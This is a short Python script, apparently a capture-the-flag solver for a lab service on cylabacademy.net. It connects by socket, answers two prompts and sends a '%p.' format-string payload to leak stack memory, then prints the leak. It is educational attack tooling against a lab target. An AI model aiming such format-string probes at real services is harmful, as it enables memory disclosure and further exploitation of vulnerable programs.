import sys, re, socket, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

HOST, PORT = "mars.cylabacademy.net", 31929


def run(a_payload, b_payload=b"2\n", wait=2.0):
    s = socket.create_connection((HOST, PORT), timeout=15)
    s.settimeout(8)
    out = b""
    try:
        out += s.recv(4096)                      # banniere + "A: "
        s.sendall(a_payload)
        if not a_payload.endswith(b"\n"):
            s.sendall(b"\n")
        time.sleep(0.4)
        try:
            out += s.recv(4096)                  # "B: "
        except Exception:
            pass
        s.sendall(b_payload)
        if not b_payload.endswith(b"\n"):
            s.sendall(b"\n")
        time.sleep(wait)
        t0 = time.time()
        while time.time() - t0 < 4:
            try:
                c = s.recv(8192)
                if not c:
                    break
                out += c
            except socket.timeout:
                break
    finally:
        s.close()
    return out.decode("latin-1", "replace")


payload = b"1" + b"%p." * 25
out = run(payload)
print("=== LEAK ===")
print(out[:1400])
